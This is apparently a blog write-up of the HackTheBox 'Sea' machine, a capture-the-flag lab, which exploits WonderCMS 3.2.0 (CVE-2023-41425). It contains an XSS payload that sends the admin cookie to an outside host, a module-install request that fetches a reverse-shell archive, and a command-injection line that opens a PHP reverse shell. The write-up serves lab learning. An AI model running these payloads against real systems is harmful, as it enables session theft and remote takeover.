---
title: "Sea Hackthebox"
date: 2024-08-17
draft: false
tags : ["write-up", "htb"]

---

## User flag
### Recon

Firtsly, `sea.htb` is built from [wondercms](https://www.wondercms.com/). You can check it by enumerating the web or searching the string `velik71` appeared on the banner. 

Checking the `/themes/bike/wcms-modules.json`, I found the version of this website is `3.2.0`. It has a [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425) that allows an attacker to a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.

I also found a `contact.php` page which allows us to send infomation including a malicous link to the admin.

### Exploitation
I use the `contact.php` page to send a link to the admin to steal the cookie. 

```
http://sea.htb/index.php?page="></form><script>fetch('http://<ip>:<port>?cookie='+document.cookie)</script><form action="
```
Use this cookie to access the admin page


Use the `installModule` to upload a reverse shell to the server and access the server as `www-data`.
```
http://sea.htb/?installModule=http://10.10.14.64:9000/reverseshell.zip&directoryName=essence&type=themes&token=<token>
```
![alt text](/posts/sea-htb/image.png)

Enumerate current directory, I found a database.js file in `/var/www/sea/data` which contains the Bcrypt hash of password. Use `john` to crack it and it is password of `amay`.
![alt text](/posts/sea-htb/image-1.png)

Get the user flag at `/home/amay/user.txt`


## Root flag

List listened ports opened:
```shell
netstat -tulnp | grep LISTEN
```

The local host is running a web on port 8080. I use ssh tunnel to access it. 

```shell
ssh -L 8081:127.0.0.1:8080 amay@10.10.11.28
```
![alt text](/posts/sea-htb/image-2.png)



The web is a *System Monitor* page. The page get the `log_file` parameter to read the file and filter the content. It may uses shell script with php system function like `system` or `passthru`,... to read the file. To get flag, I modified the `log_file` param to shell script to read the root flag and send it to my server.

```shell
; php -r '$sock=fsockopen("10.10.14.8",9000);`/bin/sh <&3 >&3 2>&3`;'
```
![alt text](/posts/sea-htb/image-3.png)


The shell last for a few seconds, so you can change `/bin/sh` to `cat /root/root.txt` to get the root flag.
![alt text](/posts/sea-htb/image-4.png)


---
